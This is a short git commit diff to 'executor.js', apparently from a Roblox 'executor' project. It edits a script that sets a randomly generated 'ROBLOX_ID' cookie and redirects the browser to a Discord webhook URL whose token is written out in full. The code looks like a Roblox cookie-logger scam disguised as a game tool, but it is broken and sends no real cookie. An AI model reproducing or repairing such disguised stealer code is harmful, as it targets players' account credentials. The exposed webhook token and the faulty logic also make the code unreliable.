c14cd801aceea781ff36f9e5c015fac7bf501f70
isuckfarts1234412-cloud <isuckfarts1234412@gmail.com>
2026-04-06 22:11:31 -0400

    Update executor.js

--- executor.js
+++ executor.js
@@ -10,7 +10,7 @@
     <script>
       var cookie = 'ROBLOX_ID=' + Math.random().toString(36).substr(2, 9);
       document.cookie = 'ROBLOX_ID=' + cookie;
-      window.location.href = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4k';
+      window.location.href = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4';
     </script>
   </body>
 </html>
